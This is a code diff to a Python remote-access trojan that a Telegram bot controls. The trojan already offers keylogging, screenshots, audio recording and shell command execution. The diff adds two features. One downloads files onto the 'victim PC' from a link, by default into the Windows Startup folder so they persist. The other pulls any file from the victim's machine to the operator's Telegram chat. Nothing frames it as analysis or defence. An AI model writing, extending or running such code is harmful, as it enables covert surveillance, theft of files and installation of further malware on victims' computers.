@@ -47,8 +47,9 @@ cmd = ''
 bot = telepot.Bot(ACCESS_TOKEN)
 url = ''
 keylog_data = '_'
-
-
+default_download_location = os.environ.get('HOMEDRIVE') + os.environ.get('HOMEPATH') + "\\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\\"
+download_step = 0
+get_file_tele_step = 0
 
 def sendKeylogs():
     global keylog_data
@@ -87,21 +88,32 @@ def screenshot():
         bot.sendPhoto(CHAT_ID,open(ts+'.png','rb'),caption="Screenshot from " + USER)
         os.remove(str(ts) + '.png')
     except Exception as e:
-        print(e)
+        print(str(e))
     return True
 
 
 def MainMenu_Send():
+    global change_rec_time_step, get_url_step, cmd_step, cmd, url, download_step, get_file_tele_step
+    change_rec_time_step = 0
+    get_url_step = 0
+    cmd_step = 0
+    cmd = ''
+    url = ''
+    download_step = 0
+    get_file_tele_step = 0
+
     #content_type, chat_type, chat_id = telepot.glance(msg)
     keyboard = InlineKeyboardMarkup(inline_keyboard=[
-       [InlineKeyboardButton(text= "Get Screenshot", callback_data = 'screenshot')],
-       [InlineKeyboardButton(text= "Start Keylogger", callback_data = 'start_keylogger')],
-       [InlineKeyboardButton(text= "Stop Keylogger", callback_data = 'stop_keylogger')],
-       [InlineKeyboardButton(text= "Record audio", callback_data = 'rec_audio')],
-       [InlineKeyboardButton(text= "Open website", callback_data = 'open_website')],
-       [InlineKeyboardButton(text= "Drive List", callback_data = 'drive_list')],
-       [InlineKeyboardButton(text= "Directory List", callback_data = 'directory_list')],
-       [InlineKeyboardButton(text= "Run cmd command", callback_data = 'run_cmd_command')]
+       [InlineKeyboardButton(text= "🌟 Get Screenshot", callback_data = 'screenshot')],
+       [InlineKeyboardButton(text= "🔑 Start Keylogger", callback_data = 'start_keylogger')],
+       [InlineKeyboardButton(text= "🔒 Stop Keylogger", callback_data = 'stop_keylogger')],
+       [InlineKeyboardButton(text= "🎤 Record audio", callback_data = 'rec_audio')],
+       [InlineKeyboardButton(text= "🌏 Open website", callback_data = 'open_website')],
+       [InlineKeyboardButton(text= "💽 Drive List", callback_data = 'drive_list')],
+       [InlineKeyboardButton(text= "🌴 Directory List", callback_data = 'directory_list')],
+       [InlineKeyboardButton(text= "🔋 Run cmd command", callback_data = 'run_cmd_command')],
+       [InlineKeyboardButton(text= "📥 Download a file to victim PC (via link)", callback_data = 'down_via_link')],
+       [InlineKeyboardButton(text= "📧 Get a file from victim PC (via Telegram)", callback_data = 'getfile_via_tele')]
        ]
        )
 
@@ -158,6 +170,51 @@ def runCmd(step):
         bot.sendMessage(CHAT_ID, "Invalid Command!", reply_markup=keyboard)
         cmd_step = 0
 
+def download(step, url, dest):
+    global download_step
+    global default_download_location
+    download_step = 1
+    if step == 1:
+        keyboard = InlineKeyboardMarkup(inline_keyboard=[
+               [InlineKeyboardButton(text= "Change Download Location", callback_data = 'change_download_location')],
+               [InlineKeyboardButton(text= "Return to Main Menu", callback_data = 'return_main_menu')]]
+               )
+        bot.sendMessage(CHAT_ID, "### Download Menu (via link) ###\nPaste the download link on the file...\nDefault Download Location: " + default_download_location, reply_markup=keyboard)
+        
+    elif step == 2:
+        # download_step = 0
+        keyboard = InlineKeyboardMarkup(inline_keyboard=[
+               [InlineKeyboardButton(text= "Desktop", callback_data = 'down_loc_desk')],
+               [InlineKeyboardButton(text= "Startup", callback_data = 'down_loc_start')],
+               [InlineKeyboardButton(text= "D:\\ Drive (root dir)", callback_data = 'down_loc_d_drive')]]
+               )
+        bot.sendMessage(CHAT_ID, "### Download Menu (via link) ###\nChange Download Location...\nDefault Download Location: " + default_download_location, reply_markup=keyboard)
+        
+    elif step == 3:
+        try:
+            r = requests.get(url)
+            with open(dest + url.split('/')[-1], 'wb') as f:
+                f.write(r.content)
+            bot.sendMessage(CHAT_ID, "File was downloaded in: " + default_download_location)
+        except Exception as e:
+            print(str(e))
+            bot.sendMessage(CHAT_ID, str(e))
+        download_step = 0
+
+def getFileTele(step, dest):
+    global get_file_tele_step
+    if step == 1:
+        get_file_tele_step = 1
+        bot.sendMessage(CHAT_ID, "### Download Menu (via Telegram) ###\nType in the full location of the file:\n(You might need the Directory Tree first!)")
+    elif step == 2:
+        try:
+            bot.sendDocument(CHAT_ID, document=open(dest))
+            bot.sendMessage(CHAT_ID, "File was uploaded to Telegram successfully")
+        except Exception as e:
+            print(str(e))
+            bot.sendMessage(CHAT_ID, str(e))
+        get_file_tele_step = 0
+
 def startUpWork():
     if internetOn() == True:
         bot.sendMessage(CHAT_ID, USER + " is online!\nMAC: " + MAC_ADDRESS + "\nPlatform: " + PLAT_FORM)
@@ -169,6 +226,7 @@ def on_callback_query(msg):
     query_id, from_id, query_data = telepot.glance(msg, flavor='callback_query')
     global keylogger_stat, cmd
     global change_rec_time_step, get_url_step, cmd_step
+    global default_download_location, url
     if query_data == 'screenshot':
         screenshot()
         MainMenu_Send()
@@ -211,7 +269,7 @@ def on_callback_query(msg):
         change_rec_time_step = 0
         get_url_step = 0
         cmd_step = 0
-        
+        download_step = 0
     elif query_data == 'open_website':
         global url
         openWebsiteMenu(1, url)
@@ -229,7 +287,21 @@ def on_callback_query(msg):
         bot.sendMessage(CHAT_ID, "Drive Tree was created and sent successfully!")
     elif query_data == 'run_cmd_command':
         runCmd(1)
- 
+    elif query_data == 'down_via_link':
+        download(1, url, default_download_location)
+    elif query_data == 'change_download_location':
+        download(2, url, default_download_location)
+    elif query_data == 'down_loc_desk':
+        default_download_location = os.environ.get('HOMEDRIVE') + os.environ.get('HOMEPATH') + "\\Desktop\\"
+        download(1, url, default_download_location)
+    elif query_data == 'down_loc_start':
+        default_download_location = os.environ.get('HOMEDRIVE') + os.environ.get('HOMEPATH') + "\\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\\"
+        download(1, url, default_download_location)
+    elif query_data == 'down_loc_d_drive':
+        default_download_location = "D:\\"
+        download(1, url, default_download_location)
+    elif query_data == 'getfile_via_tele':
+        getFileTele(1, ' ')
 
 def on_chat_message(msg):
     global change_rec_time_step
@@ -256,7 +328,17 @@ def on_chat_message(msg):
     elif cmd_step == 1:
         cmd = str(msg['text'])
         runCmd(2)
-    
+    elif download_step == 1:
+        download_step == 0
+        url = msg['text']
+        download(3, url, default_download_location)
+        url = ''
+        MainMenu_Send()
+    elif get_file_tele_step == 1:
+        get_file_tele_step == 0
+        getFileTele(2, str(msg['text']))
+        MainMenu_Send()
+        
     else:
         bot.sendMessage(CHAT_ID, "Invalid Command!!!")
         MainMenu_Send()
